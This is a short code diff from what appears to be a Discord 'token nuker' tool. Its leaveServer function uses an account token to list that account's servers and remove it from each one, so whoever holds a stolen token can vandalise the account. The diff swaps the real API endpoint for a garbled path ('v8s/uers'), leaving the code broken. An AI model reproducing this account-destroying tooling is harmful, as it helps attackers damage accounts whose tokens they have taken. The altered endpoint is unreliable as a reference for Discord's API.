@@ -5,7 +5,7 @@ from Helper.Plugs.TokenNukerPlugs import *
 def leaveServer(token):
     new_title("Nexus Leave Server")
     headers = {'Authorization': token}
-    guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
+    guildsIds = requests.get("https://discord.com/api/v8s/uers/@me/guilds", headers=getheaders(token)).json()
     for guild in guildsIds:
         try:
             requests.delete(
